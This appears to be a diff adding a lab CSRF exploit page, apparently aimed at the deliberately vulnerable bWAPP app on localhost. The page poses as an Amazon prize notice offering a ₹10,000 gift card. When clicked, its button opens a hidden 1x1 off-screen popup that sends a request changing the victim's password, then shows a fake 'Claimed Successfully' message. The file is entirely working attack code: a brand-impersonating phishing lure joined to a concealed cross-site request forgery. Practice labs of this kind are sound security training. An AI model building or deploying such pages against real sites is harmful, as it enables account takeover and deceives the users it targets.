@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Amazon - You Won!</title>
+  <style>
+    body { font-family: Arial; background: #f0f0f0; margin: 0; }
+    .header { background: #232f3e; color: white;
+              padding: 15px; font-size: 24px; }
+    .logo { color: #ff9900; font-weight: bold; }
+    .container { max-width: 600px; margin: 50px auto;
+                 background: white; padding: 30px;
+                 border-radius: 8px; text-align: center; }
+    .prize-box { background: #ff9900; color: white;
+                 padding: 20px; border-radius: 8px;
+                 font-size: 22px; margin: 20px 0; }
+    .btn { background: #ff9900; color: white;
+           padding: 15px 40px; border: none;
+           font-size: 18px; border-radius: 5px;
+           cursor: pointer; }
+  </style>
+</head>
+<body>
+
+<div class="header">
+  <span class="logo">amazon</span>
+</div>
+
+<div class="container">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg"
+       width="150" /><br><br>
+
+  <div class="prize-box" id="prizeMsg">
+    🎉 Congratulations! You won ₹10,000 Amazon Gift Card!
+  </div>
+
+  <p>Dear Valued Customer,</p>
+  <p>Your account has been selected for our annual lucky draw!</p>
+  <p>Click below to claim your reward immediately.</p>
+
+  <button class="btn" id="claimBtn" onclick="attack()">
+    Claim Your Prize Now!
+  </button>
+
+  <p><small>Offer valid for 24 hours only.</small></p>
+</div>
+
+<script>
+function attack() {
+
+  // Step 1 — Disable button, show processing
+  document.getElementById('claimBtn').disabled = true;
+  document.getElementById('claimBtn').innerText = 'Processing...';
+  document.getElementById('prizeMsg').innerHTML = 
+    '⏳ Verifying your account...';
+
+  // Step 2 — Open CSRF URL in tiny popup window
+  // This is navigation = cookies sent! ✅
+  var popup = window.open(
+    'http://127.0.0.1/bWAPP/csrf_1.php?password_new=rudhra&password_conf=rudhra&action=change',
+    'prize',
+    'width=1,height=1,top=2000,left=2000'
+    // Opens off-screen tiny window!
+  );
+
+  // Step 3 — Close popup after 2 seconds
+  // Victim barely notices it
+  setTimeout(function() {
+    if(popup) popup.close();
+  }, 2000);
+
+  // Step 4 — Show fake success to victim
+  setTimeout(function() {
+    document.getElementById('prizeMsg').innerHTML =
+      '✅ ₹10,000 Gift Card sent to your registered email!';
+    document.getElementById('claimBtn').innerText =
+      '🎁 Claimed Successfully!';
+  }, 3000);
+}
+</script>
+
+</body>
+</html>
